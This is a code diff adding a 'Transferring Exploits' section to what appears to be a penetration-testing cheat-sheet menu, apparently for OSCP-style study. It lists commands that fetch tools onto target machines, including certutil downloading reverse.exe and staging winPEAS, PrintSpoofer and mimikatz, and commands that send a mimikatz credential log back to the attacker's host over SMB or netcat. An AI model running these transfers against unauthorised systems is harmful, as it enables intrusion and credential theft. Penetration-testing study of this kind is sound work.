@@ -1420,7 +1420,70 @@ menu_structure = {
         ("gpp-decrypt \"edBSHOw...jTLfCuNH8pG5aSVYdYw/NglVmQ\"","GPP Decrypt"),
         ],
     },
-    "Transferring Exploits": {},
+    "Transferring Exploits": 
+    {
+        "From Kali to Linux":
+        {
+            "Apache":
+                [
+                ("service apache2 start","Starting server"),
+                ("http://[IP Webserver]","Accessing the file"),
+                ("service apache2 stop","Stopping the service"),
+                ],
+            "Python":
+                [
+                ("sudo python3 -m http.server [Optional: port]","Starting server"),
+                ("wget http://$IP[:port]/[File name]","Downloading to target machine"),
+                ("chmod +x [filename]","Executing downloaded file"),
+                ],
+            "SCP (Secure copy)":
+                [
+                ("scp <target_computer> <local_directory>","Running from local machine"),
+                ("scp mark@10.10.10.58:/tmp/report-21-05-23 .","Running from local machine"),
+                ],
+            "nc":
+                [
+                ("nc [kali_machine_IP] 1 < [file_to_copy]  ","Target machine"),
+                ("nc -nlvp 1 > [name_of_file]","Kali machine"),
+                ],
+        },
+        "From Kali to Windows":
+        {
+            "Cerutil":
+            [
+            ("certutil -urlcache -split -f http://[IP] nc.exe","Cerutil"),
+            ("cmd.exe /c certutil -urlcache -split -f http://192.168.45.205/reverse.exe reverse.exe","Cerutil"),
+            ],
+            "Powershell":
+            [
+            ("iwr -uri http://[IP]/winPEASx64.exe -Outfile winPEAS.exe","PS")
+            ],
+            "Netcat":
+            [
+            ("nc 192.168.100.107 8080 < /root/Desktop/transfer.txt","nc - Kali"),
+            ("nc -lvp 8080 > /root/Desktop/transfer.txt","nc - Target machine"),
+            ],
+            "SMB":
+            [
+            ("impacket-smbserver share /home/kali/OSCP_tools/win_priv_esc_tools -smb2support","SMB - Kali"),
+            ("copy \\192.168.45.163\\share\\PrintSpoofer.exe C:\\Users\\Public\\PrintSpoofer.exe","SMB - Target machine"),
+            ],
+        },
+        "From Windows to Kali":
+        {
+            "SMB Authenticated":
+            [
+            ("impacket-smbserver test . -smb2support -username kali -password kali","SMB Authenticated Local"),
+            ("net use m: \\\\Kali_IP\\\test /user:kali kali","SMB Authenticated Target"),
+            ("copy mimikatz.log m:\\","SMB Authenticated Target"),
+            ],
+            "Evil-WinRM Commands":
+            [
+            ("upload mimikatz.exe C:\\windows  asks\\mimikatz.exe","Upload"),
+            ("download mimikatz.log /home/kali/Documents/pen-200","Download"),
+            ],
+        },
+    },
     "Port Redirection": {}
 }
 
